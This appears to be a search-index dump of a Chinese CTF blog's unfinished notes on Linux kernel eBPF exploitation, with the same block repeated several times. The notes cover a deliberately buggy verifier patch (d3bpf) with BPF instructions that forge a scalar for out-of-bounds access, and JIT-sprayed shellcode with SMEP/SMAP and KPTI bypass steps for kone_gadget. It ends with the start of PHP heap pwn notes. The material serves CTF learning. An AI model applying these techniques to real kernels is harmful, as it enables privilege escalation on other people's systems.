37581919e..8e98d4af5 100644 --- a/kernel/bpf/verifier.c +++ b/kernel/bpf/verifier.c @@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, scalar_min_max_lsh(dst_reg, \u0026src_reg); break; case BPF_RSH: - if (umax_val \u003e= insn_bitness) { - /* Shifts greater than 31 or 63 are undefined. - * This includes shifts by a negative number. - */ - mark_reg_unknown(env, regs, insn-\u003edst_reg); + if (umin_val \u003e= insn_bitness) { + if (alu32) + __mark_reg32_known(dst_reg, 0); + else + __mark_reg_known_zero(dst_reg); break; } if (alu32) 把这个patch翻译一下： BPF_MOV64_IMM(BPF_REG_0, 0x1337), BPF_MOV64_IMM(BPF_REG_1, 64), BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), BPF_EXIT_INSN() 那么，verifier就会认为这个reg0为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数\u002663，所以实际上CPU执行的运算是0x1337 \u003e\u003e 0。 这里就伪造了一个绕过verifier检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写 任意地址读写\r写入array_map_update_elem 、ARRAY_MAP_LOOKUP_ELEM、array_of_map_gen_lookup、array_map_free array_of_map_gen_lookup 有个map类型是BPF_MAP_TYPE_ARRAY_OF_MAPS，它是一个存储map的数组，它的lookup_elem函数会解引用两次 static void *array_of_map_lookup_elem(struct bpf_map *map, void *key) { struct bpf_map **inner_map = array_map_lookup_elem(map, key); if (!inner_map) return NULL; return READ_ONCE(*inner_map); } 把map_lookup_elem改成array_of_map_gen_lookup后，使用 lookup_element时verifier会认为它返回了一个指向map_value的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西 思路流程\r先初始化stack","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:2:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#uoftctf-2026----extended-ebpf"},{"categories":["pwn"],"collections":null,"content":"例题\rSEC CON CTF 2021 kone_gadget\rmkdir initramfs cd initramfs cp ../rootfs.cpio . sudo cpio -idm \u003c ./rootfs.cpio rm rootfs.cpio gcc exp.c -static -masm=intel -g -o ./initramfs/exp cd ./initramfs sudo find . | sudo cpio -o --format=newc \u003e../rootfs.cpio cd .. 提供了一个新的系统调用，能控制rip，但是其他寄存器都置0 Added to arch/x86/entry/syscalls/syscall_64.tbl: 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } 大概思路就是往内核中写入一个one_gadget，调用它就能提权 同时，题目也禁掉了bpf系统调用 写了个exp: #include #include #include #include int main() { // 尝试调用 bpf 系统调用 long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号 if (ret == -1 \u0026\u0026 errno == ENOSYS) { printf(\"内核不支持该系统调用 (ENOSYS)\\n\"); } else { printf(\"内核支持该系统调用，返回值为: %ld\\n\", ret); } return 0; } / $ ./exp 内核不支持该系统调用 (ENOSYS) / # cat /proc/sys/net/core/bpf_jit_enable 1 来自AI： 如果是： 2 → 致盲开启，老套路基本死 1 → 还能打 0 → 先想办法打开 JIT 没开致盲 但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。 所以，思路就是使用prctl写入一段bpf程序到内核中，调用seccon系统调用，控制rip执行这段我们自定义的程序来提权 程序怎么写？ 怎么执行到这段程序？ 编写shellcode\r开了smep、smap保护，需要写cr4寄存器为0x6f0来绕过 开了kpti，通过执行swapgs_restore_regs_and_return_to_usermode，切换页表后返回用户态提权 写入的指令需要是ebpf格式，经过jit编译后，是x86指令 这里两篇参考文章构造的ebpf指令格式都是，p32(0)+p32(A)，经过jit编译后他会变成0xb8+p32(A)存入内存中 这里的ebpf指令的opcode被设置为0，其实是设置成了BPF_LD | BPF_IMM | BPF_W，也就是ldw pwndbg\u003e x/32b 0xffffffffc00005d0 0xffffffffc00005d0: 0x48 0x89 0xc7 0x04 0xb8 0x58 0x90 0xeb 0xffffffffc00005d8: 0x01 0xb8 0xff 0xd0 0xeb 0x01 0xb8 0x58 0xffffffffc00005e0: 0x90 0xeb 0x01 0xb8 0xff 0xe0 0xeb 0x01 0xffffffffc00005e8: 0xb8 0x90 0x90 0xeb 0x01 0xb8 0x90 0x90 每两个A直接间隔一个0xb8，跳过0xb8的思路有两种： 写A中的一个字节为0x3c和0xb8组成 cmp al, 0xb8： 内存 x86 0xb0 0x12 mov al, 0x12 0x90 nop 0x3c 0xb8 cmp al, 0xb8 ;用0x3c吃掉一个0xb8 0xb4 0x34 mov ah, 0x34 0x90 nop 0x3c ... ... ;继续吃掉下一个0xb8 写A中的两个字节为0xeb 0x01（PC = PC+1），来跳过0xb8 内存 x86 0xb0 0x12 mov al, 0x12 0xeb 0x01 jmp $+3 ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1 0xb8 0xb4 0x34 mov ah, 0x34 0xeb 0x01 jmp $+3 ... 参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2 D^3CTF 2022__d3bpf\r内核ebpf 这里的bzImage可以直接用vmlinux-to-elf提取 patch后，如果对一个寄存器右移的位数大于insn_bitness（ALU32运算为32，ALU64为64），则verifier认为该寄存器全部bit已知（补充：指针不可以与标记为unknown的寄存器进行ALU运算），且verifier认为其值为0 diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c index 37581919e..8e98d4af5 100644 --- a/kernel/bpf/verifier.c +++ b/kernel/bpf/verifier.c @@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, scalar_min_max_lsh(dst_reg, \u0026src_reg); break; case BPF_RSH: - if (umax_val \u003e= insn_bitness) { - /* Shifts greater than 31 or 63 are undefined. - * This includes shifts by a negative number. - */ - mark_reg_unknown(env, regs, insn-\u003edst_reg); + if (umin_val \u003e= insn_bitness) { + if (alu32) + __mark_reg32_known(dst_reg, 0); + else + __mark_reg_known_zero(dst_reg); break; } if (alu32) 把这个patch翻译一下： BPF_MOV64_IMM(BPF_REG_0, 0x1337), BPF_MOV64_IMM(BPF_REG_1, 64), BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), BPF_EXIT_INSN() 那么，verifier就会认为这个reg0为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数\u002663，所以实际上CPU执行的运算是0x1337 \u003e\u003e 0。 这里就伪造了一个绕过verifier检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写 任意地址读写\r写入array_map_update_elem 、ARRAY_MAP_LOOKUP_ELEM、array_of_map_gen_lookup、array_map_free array_of_map_gen_lookup 有个map类型是BPF_MAP_TYPE_ARRAY_OF_MAPS，它是一个存储map的数组，它的lookup_elem函数会解引用两次 static void *array_of_map_lookup_elem(struct bpf_map *map, void *key) { struct bpf_map **inner_map = array_map_lookup_elem(map, key); if (!inner_map) return NULL; return READ_ONCE(*inner_map); } 把map_lookup_elem改成array_of_map_gen_lookup后，使用 lookup_element时verifier会认为它返回了一个指向map_value的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西 思路流程\r先初始化stack","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:2:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#源码-1"},{"categories":["pwn"],"collections":null,"content":"例题\rSEC CON CTF 2021 kone_gadget\rmkdir initramfs cd initramfs cp ../rootfs.cpio . sudo cpio -idm \u003c ./rootfs.cpio rm rootfs.cpio gcc exp.c -static -masm=intel -g -o ./initramfs/exp cd ./initramfs sudo find . | sudo cpio -o --format=newc \u003e../rootfs.cpio cd .. 提供了一个新的系统调用，能控制rip，但是其他寄存器都置0 Added to arch/x86/entry/syscalls/syscall_64.tbl: 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } 大概思路就是往内核中写入一个one_gadget，调用它就能提权 同时，题目也禁掉了bpf系统调用 写了个exp: #include #include #include #include int main() { // 尝试调用 bpf 系统调用 long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号 if (ret == -1 \u0026\u0026 errno == ENOSYS) { printf(\"内核不支持该系统调用 (ENOSYS)\\n\"); } else { printf(\"内核支持该系统调用，返回值为: %ld\\n\", ret); } return 0; } / $ ./exp 内核不支持该系统调用 (ENOSYS) / # cat /proc/sys/net/core/bpf_jit_enable 1 来自AI： 如果是： 2 → 致盲开启，老套路基本死 1 → 还能打 0 → 先想办法打开 JIT 没开致盲 但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。 所以，思路就是使用prctl写入一段bpf程序到内核中，调用seccon系统调用，控制rip执行这段我们自定义的程序来提权 程序怎么写？ 怎么执行到这段程序？ 编写shellcode\r开了smep、smap保护，需要写cr4寄存器为0x6f0来绕过 开了kpti，通过执行swapgs_restore_regs_and_return_to_usermode，切换页表后返回用户态提权 写入的指令需要是ebpf格式，经过jit编译后，是x86指令 这里两篇参考文章构造的ebpf指令格式都是，p32(0)+p32(A)，经过jit编译后他会变成0xb8+p32(A)存入内存中 这里的ebpf指令的opcode被设置为0，其实是设置成了BPF_LD | BPF_IMM | BPF_W，也就是ldw pwndbg\u003e x/32b 0xffffffffc00005d0 0xffffffffc00005d0: 0x48 0x89 0xc7 0x04 0xb8 0x58 0x90 0xeb 0xffffffffc00005d8: 0x01 0xb8 0xff 0xd0 0xeb 0x01 0xb8 0x58 0xffffffffc00005e0: 0x90 0xeb 0x01 0xb8 0xff 0xe0 0xeb 0x01 0xffffffffc00005e8: 0xb8 0x90 0x90 0xeb 0x01 0xb8 0x90 0x90 每两个A直接间隔一个0xb8，跳过0xb8的思路有两种： 写A中的一个字节为0x3c和0xb8组成 cmp al, 0xb8： 内存 x86 0xb0 0x12 mov al, 0x12 0x90 nop 0x3c 0xb8 cmp al, 0xb8 ;用0x3c吃掉一个0xb8 0xb4 0x34 mov ah, 0x34 0x90 nop 0x3c ... ... ;继续吃掉下一个0xb8 写A中的两个字节为0xeb 0x01（PC = PC+1），来跳过0xb8 内存 x86 0xb0 0x12 mov al, 0x12 0xeb 0x01 jmp $+3 ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1 0xb8 0xb4 0x34 mov ah, 0x34 0xeb 0x01 jmp $+3 ... 参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2 D^3CTF 2022__d3bpf\r内核ebpf 这里的bzImage可以直接用vmlinux-to-elf提取 patch后，如果对一个寄存器右移的位数大于insn_bitness（ALU32运算为32，ALU64为64），则verifier认为该寄存器全部bit已知（补充：指针不可以与标记为unknown的寄存器进行ALU运算），且verifier认为其值为0 diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c index 37581919e..8e98d4af5 100644 --- a/kernel/bpf/verifier.c +++ b/kernel/bpf/verifier.c @@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, scalar_min_max_lsh(dst_reg, \u0026src_reg); break; case BPF_RSH: - if (umax_val \u003e= insn_bitness) { - /* Shifts greater than 31 or 63 are undefined. - * This includes shifts by a negative number. - */ - mark_reg_unknown(env, regs, insn-\u003edst_reg); + if (umin_val \u003e= insn_bitness) { + if (alu32) + __mark_reg32_known(dst_reg, 0); + else + __mark_reg_known_zero(dst_reg); break; } if (alu32) 把这个patch翻译一下： BPF_MOV64_IMM(BPF_REG_0, 0x1337), BPF_MOV64_IMM(BPF_REG_1, 64), BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), BPF_EXIT_INSN() 那么，verifier就会认为这个reg0为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数\u002663，所以实际上CPU执行的运算是0x1337 \u003e\u003e 0。 这里就伪造了一个绕过verifier检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写 任意地址读写\r写入array_map_update_elem 、ARRAY_MAP_LOOKUP_ELEM、array_of_map_gen_lookup、array_map_free array_of_map_gen_lookup 有个map类型是BPF_MAP_TYPE_ARRAY_OF_MAPS，它是一个存储map的数组，它的lookup_elem函数会解引用两次 static void *array_of_map_lookup_elem(struct bpf_map *map, void *key) { struct bpf_map **inner_map = array_map_lookup_elem(map, key); if (!inner_map) return NULL; return READ_ONCE(*inner_map); } 把map_lookup_elem改成array_of_map_gen_lookup后，使用 lookup_element时verifier会认为它返回了一个指向map_value的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西 思路流程\r先初始化stack","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:2:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#利用思路"},{"categories":["pwn"],"collections":null,"content":"例题\rSEC CON CTF 2021 kone_gadget\rmkdir initramfs cd initramfs cp ../rootfs.cpio . sudo cpio -idm \u003c ./rootfs.cpio rm rootfs.cpio gcc exp.c -static -masm=intel -g -o ./initramfs/exp cd ./initramfs sudo find . | sudo cpio -o --format=newc \u003e../rootfs.cpio cd .. 提供了一个新的系统调用，能控制rip，但是其他寄存器都置0 Added to arch/x86/entry/syscalls/syscall_64.tbl: 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } 大概思路就是往内核中写入一个one_gadget，调用它就能提权 同时，题目也禁掉了bpf系统调用 写了个exp: #include #include #include #include int main() { // 尝试调用 bpf 系统调用 long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号 if (ret == -1 \u0026\u0026 errno == ENOSYS) { printf(\"内核不支持该系统调用 (ENOSYS)\\n\"); } else { printf(\"内核支持该系统调用，返回值为: %ld\\n\", ret); } return 0; } / $ ./exp 内核不支持该系统调用 (ENOSYS) / # cat /proc/sys/net/core/bpf_jit_enable 1 来自AI： 如果是： 2 → 致盲开启，老套路基本死 1 → 还能打 0 → 先想办法打开 JIT 没开致盲 但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。 所以，思路就是使用prctl写入一段bpf程序到内核中，调用seccon系统调用，控制rip执行这段我们自定义的程序来提权 程序怎么写？ 怎么执行到这段程序？ 编写shellcode\r开了smep、smap保护，需要写cr4寄存器为0x6f0来绕过 开了kpti，通过执行swapgs_restore_regs_and_return_to_usermode，切换页表后返回用户态提权 写入的指令需要是ebpf格式，经过jit编译后，是x86指令 这里两篇参考文章构造的ebpf指令格式都是，p32(0)+p32(A)，经过jit编译后他会变成0xb8+p32(A)存入内存中 这里的ebpf指令的opcode被设置为0，其实是设置成了BPF_LD | BPF_IMM | BPF_W，也就是ldw pwndbg\u003e x/32b 0xffffffffc00005d0 0xffffffffc00005d0: 0x48 0x89 0xc7 0x04 0xb8 0x58 0x90 0xeb 0xffffffffc00005d8: 0x01 0xb8 0xff 0xd0 0xeb 0x01 0xb8 0x58 0xffffffffc00005e0: 0x90 0xeb 0x01 0xb8 0xff 0xe0 0xeb 0x01 0xffffffffc00005e8: 0xb8 0x90 0x90 0xeb 0x01 0xb8 0x90 0x90 每两个A直接间隔一个0xb8，跳过0xb8的思路有两种： 写A中的一个字节为0x3c和0xb8组成 cmp al, 0xb8： 内存 x86 0xb0 0x12 mov al, 0x12 0x90 nop 0x3c 0xb8 cmp al, 0xb8 ;用0x3c吃掉一个0xb8 0xb4 0x34 mov ah, 0x34 0x90 nop 0x3c ... ... ;继续吃掉下一个0xb8 写A中的两个字节为0xeb 0x01（PC = PC+1），来跳过0xb8 内存 x86 0xb0 0x12 mov al, 0x12 0xeb 0x01 jmp $+3 ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1 0xb8 0xb4 0x34 mov ah, 0x34 0xeb 0x01 jmp $+3 ... 参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2 D^3CTF 2022__d3bpf\r内核ebpf 这里的bzImage可以直接用vmlinux-to-elf提取 patch后，如果对一个寄存器右移的位数大于insn_bitness（ALU32运算为32，ALU64为64），则verifier认为该寄存器全部bit已知（补充：指针不可以与标记为unknown的寄存器进行ALU运算），且verifier认为其值为0 diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c index 37581919e..8e98d4af5 100644 --- a/kernel/bpf/verifier.c +++ b/kernel/bpf/verifier.c @@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, scalar_min_max_lsh(dst_reg, \u0026src_reg); break; case BPF_RSH: - if (umax_val \u003e= insn_bitness) { - /* Shifts greater than 31 or 63 are undefined. - * This includes shifts by a negative number. - */ - mark_reg_unknown(env, regs, insn-\u003edst_reg); + if (umin_val \u003e= insn_bitness) { + if (alu32) + __mark_reg32_known(dst_reg, 0); + else + __mark_reg_known_zero(dst_reg); break; } if (alu32) 把这个patch翻译一下： BPF_MOV64_IMM(BPF_REG_0, 0x1337), BPF_MOV64_IMM(BPF_REG_1, 64), BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), BPF_EXIT_INSN() 那么，verifier就会认为这个reg0为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数\u002663，所以实际上CPU执行的运算是0x1337 \u003e\u003e 0。 这里就伪造了一个绕过verifier检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写 任意地址读写\r写入array_map_update_elem 、ARRAY_MAP_LOOKUP_ELEM、array_of_map_gen_lookup、array_map_free array_of_map_gen_lookup 有个map类型是BPF_MAP_TYPE_ARRAY_OF_MAPS，它是一个存储map的数组，它的lookup_elem函数会解引用两次 static void *array_of_map_lookup_elem(struct bpf_map *map, void *key) { struct bpf_map **inner_map = array_map_lookup_elem(map, key); if (!inner_map) return NULL; return READ_ONCE(*inner_map); } 把map_lookup_elem改成array_of_map_gen_lookup后，使用 lookup_element时verifier会认为它返回了一个指向map_value的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西 思路流程\r先初始化stack","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:2:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#downunderctf-2025_rolling-around"},{"categories":["pwn"],"collections":null,"content":"例题\rSEC CON CTF 2021 kone_gadget\rmkdir initramfs cd initramfs cp ../rootfs.cpio . sudo cpio -idm \u003c ./rootfs.cpio rm rootfs.cpio gcc exp.c -static -masm=intel -g -o ./initramfs/exp cd ./initramfs sudo find . | sudo cpio -o --format=newc \u003e../rootfs.cpio cd .. 提供了一个新的系统调用，能控制rip，但是其他寄存器都置0 Added to arch/x86/entry/syscalls/syscall_64.tbl: 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } 大概思路就是往内核中写入一个one_gadget，调用它就能提权 同时，题目也禁掉了bpf系统调用 写了个exp: #include #include #include #include int main() { // 尝试调用 bpf 系统调用 long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号 if (ret == -1 \u0026\u0026 errno == ENOSYS) { printf(\"内核不支持该系统调用 (ENOSYS)\\n\"); } else { printf(\"内核支持该系统调用，返回值为: %ld\\n\", ret); } return 0; } / $ ./exp 内核不支持该系统调用 (ENOSYS) / # cat /proc/sys/net/core/bpf_jit_enable 1 来自AI： 如果是： 2 → 致盲开启，老套路基本死 1 → 还能打 0 → 先想办法打开 JIT 没开致盲 但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。 所以，思路就是使用prctl写入一段bpf程序到内核中，调用seccon系统调用，控制rip执行这段我们自定义的程序来提权 程序怎么写？ 怎么执行到这段程序？ 编写shellcode\r开了smep、smap保护，需要写cr4寄存器为0x6f0来绕过 开了kpti，通过执行swapgs_restore_regs_and_return_to_usermode，切换页表后返回用户态提权 写入的指令需要是ebpf格式，经过jit编译后，是x86指令 这里两篇参考文章构造的ebpf指令格式都是，p32(0)+p32(A)，经过jit编译后他会变成0xb8+p32(A)存入内存中 这里的ebpf指令的opcode被设置为0，其实是设置成了BPF_LD | BPF_IMM | BPF_W，也就是ldw pwndbg\u003e x/32b 0xffffffffc00005d0 0xffffffffc00005d0: 0x48 0x89 0xc7 0x04 0xb8 0x58 0x90 0xeb 0xffffffffc00005d8: 0x01 0xb8 0xff 0xd0 0xeb 0x01 0xb8 0x58 0xffffffffc00005e0: 0x90 0xeb 0x01 0xb8 0xff 0xe0 0xeb 0x01 0xffffffffc00005e8: 0xb8 0x90 0x90 0xeb 0x01 0xb8 0x90 0x90 每两个A直接间隔一个0xb8，跳过0xb8的思路有两种： 写A中的一个字节为0x3c和0xb8组成 cmp al, 0xb8： 内存 x86 0xb0 0x12 mov al, 0x12 0x90 nop 0x3c 0xb8 cmp al, 0xb8 ;用0x3c吃掉一个0xb8 0xb4 0x34 mov ah, 0x34 0x90 nop 0x3c ... ... ;继续吃掉下一个0xb8 写A中的两个字节为0xeb 0x01（PC = PC+1），来跳过0xb8 内存 x86 0xb0 0x12 mov al, 0x12 0xeb 0x01 jmp $+3 ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1 0xb8 0xb4 0x34 mov ah, 0x34 0xeb 0x01 jmp $+3 ... 参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2 D^3CTF 2022__d3bpf\r内核ebpf 这里的bzImage可以直接用vmlinux-to-elf提取 patch后，如果对一个寄存器右移的位数大于insn_bitness（ALU32运算为32，ALU64为64），则verifier认为该寄存器全部bit已知（补充：指针不可以与标记为unknown的寄存器进行ALU运算），且verifier认为其值为0 diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c index 37581919e..8e98d4af5 100644 --- a/kernel/bpf/verifier.c +++ b/kernel/bpf/verifier.c @@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, scalar_min_max_lsh(dst_reg, \u0026src_reg); break; case BPF_RSH: - if (umax_val \u003e= insn_bitness) { - /* Shifts greater than 31 or 63 are undefined. - * This includes shifts by a negative number. - */ - mark_reg_unknown(env, regs, insn-\u003edst_reg); + if (umin_val \u003e= insn_bitness) { + if (alu32) + __mark_reg32_known(dst_reg, 0); + else + __mark_reg_known_zero(dst_reg); break; } if (alu32) 把这个patch翻译一下： BPF_MOV64_IMM(BPF_REG_0, 0x1337), BPF_MOV64_IMM(BPF_REG_1, 64), BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), BPF_EXIT_INSN() 那么，verifier就会认为这个reg0为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数\u002663，所以实际上CPU执行的运算是0x1337 \u003e\u003e 0。 这里就伪造了一个绕过verifier检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写 任意地址读写\r写入array_map_update_elem 、ARRAY_MAP_LOOKUP_ELEM、array_of_map_gen_lookup、array_map_free array_of_map_gen_lookup 有个map类型是BPF_MAP_TYPE_ARRAY_OF_MAPS，它是一个存储map的数组，它的lookup_elem函数会解引用两次 static void *array_of_map_lookup_elem(struct bpf_map *map, void *key) { struct bpf_map **inner_map = array_map_lookup_elem(map, key); if (!inner_map) return NULL; return READ_ONCE(*inner_map); } 把map_lookup_elem改成array_of_map_gen_lookup后，使用 lookup_element时verifier会认为它返回了一个指向map_value的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西 思路流程\r先初始化stack","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:2:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#阿里云ctf-2025-beebee"},{"categories":["pwn"],"collections":null,"content":"ref\rBPF之路一bpf系统调用，主要涉及ebpf的JIT部分 SECCON2021-kone_gadget WP Linux内核eBPF虚拟机源码分析——verifier与jit Jailbreaking eBPF Linux内核PWN [BPF模块整数溢出] 漏洞分析 a3 Linux内核eBPF虚拟机源码分析——verifier与jit ebpf docs https://github.com/iovisor/bpf-docs/blob/master/eBPF.md https://stdnoerr.blog/blog/eBPF-exploitation-D3CTF-d3bpf https://196082.github.io/2023/01/06/d3bpf/ ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:3:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#ref"},{"categories":["pwn"],"collections":null,"content":"参考文章\r有些前置的东西可以看这些文章 https://bbs.kanxue.com/thread-286446.htm https://www.anquanke.com/post/id/204404 https://imlzh1.github.io/posts/PHP-So-Pwn/#zend_parse_parameters https://www.bookstack.cn/read/php7-internal/7-implement.md https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/05/mixture/ ‍ ","date":"2026-02-02","objectID":"/posts/phppwn_note/:1:0","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#参考文章"},{"categories":["pwn"],"collections":null,"content":"笔记\r","date":"2026-02-02","objectID":"/posts/phppwn_note/:2:0","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#笔记"},{"categories":["pwn"],"collections":null,"content":"常用\r搭建镜像的时候，要下载gdbserver和vim，方便后面做题 RUN apt-get install -y gdbserver vim 查看配置和扩展： php -i | grep -E \"disable_functions|disable_classes|extension = |Loaded Configuration File|extension_dir\" php -m | grep hackphp ","date":"2026-02-02","objectID":"/posts/phppwn_note/:2:1","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#常用"},{"categories":["pwn"],"collections":null,"content":"emalloc_playground\r写了一个类似how2heap的malloc_playground的扩展，用于理解emalloc的底层行为 //emalloc_playground.c /* emalloc_playground extension for PHP */ #ifdef HAVE_CONFIG_H #include \"config.h\" #endif #include \"php.h\" #include \"php_emalloc_playground.h\" #include \"emalloc_playground_arginfo.h\" #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cinttypes.h\u003e #include \u003cctype.h\u003e #include \u003cstring.h\u003e #include \u003csys/types.h\u003e #include \u003cunistd.h\u003e /* 分配记录结构 */ typedef struct { void *ptr; size_t size; } allocation_t; /* 全局状态 */ static struct { allocation_t *allocations; size_t count; size_t capacity; zend_bool initialized; } playground_state = {0}; /* 初始化模块 */ PHP_MINIT_FUNCTION(emalloc_playground) { playground_state.allocations = ecalloc(8, sizeof(allocation_t)); playground_state.capacity = 8; playground_state.count = 0; playground_state.initialized = 1; return SUCCESS; } /* 关闭模块 */ PHP_MSHUTDOWN_FUNCTION(emalloc_playground) { if (playground_state.initialized) { for (size_t i = 0; i \u003c playground_state.count; i++) { if (playground_state.allocations[i].ptr) { efree(playground_state.allocations[i].ptr); } } efree(playground_state.allocations); playground_state.initialized = 0; } return SUCCESS; } /* 辅助函数：移除首尾空格 */ static void string_trim(char *s) { char *p = s; while (isspace((unsigned char)*p)) p++; if (p != s) memmove(s, p, strlen(p) + 1); size_t len = strlen(s); while (len \u003e 0 \u0026\u0026 isspace((unsigned char)s[len-1])) s[--len] = '\\0'; } /* 解析大小字符串（支持十六进制） */ static size_t parse_size_string(const char *s) { if (!s) return 0; while (isspace((unsigned char)*s)) s++; if (s[0]=='0' \u0026\u0026 (s[1]=='x' || s[1]=='X')) { return (size_t) strtoull(s+2, NULL, 16); } else { return 